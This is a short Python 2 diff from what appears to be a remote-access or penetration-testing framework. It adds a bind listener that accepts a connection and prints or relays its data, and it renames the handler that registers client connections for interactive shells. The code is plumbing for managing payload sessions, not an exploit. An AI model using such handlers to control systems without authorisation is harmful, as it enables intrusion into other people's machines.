@@ -10,8 +10,44 @@ from threading import Thread
 from main import *
 from menu import *
 
+def startBindListener(portnum,useProxy):
+    try:
+        bs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        bs.bind((FUNCTIONS().CheckInternet(), portnum))
+        bs.listen(1)
+        if useProxy:
+            bsp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            bsp.bind(('127.0.0.1', 8888))
+            bsp.listen(1)
+    except:
+        print t.bold_red + "[*] Error with listener - Port in use" + t.normal
 
-def startListener():
+    print t.bold_red + "listening on port %s"%portnum + t.normal
+
+    bindClient, bindAddress = bs.accept()
+    bindIp, bindPort = bindAddress
+    print t.bold_green + "connection from %s %s"%(bindIp, bindPort) + t.normal
+    if useProxy:
+        subprocess.Popen(['firefox','127.0.0.1:8888'])
+        bindServer, bindServerAddress = bsp.accept()
+    while bindClient:
+        try:
+            bindData = bindClient.recv(8000)
+            if useProxy:
+                bindServer.sendall(bindData)
+                continue
+            else:
+                print bindData
+        except:
+            print t.bold_red + "connection closed from %s %s"%(bindIp, bindPort) + t.normal
+            break
+            
+    if useProxy:
+        bsp.close()
+    bs.close()
+
+
+def startClientListener():
     time.sleep(0.25)
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -47,7 +83,6 @@ def startListener():
         from menu import clientMenuOptions
         clientMenuOptions[str(clientnumber)] =  {'payloadchoice': None, 'payload':ip + ":" + str(port), 'extrawork': interactShell, 'params': (clientconn,clientnumber)}
     ws.close()
-
 
 
 
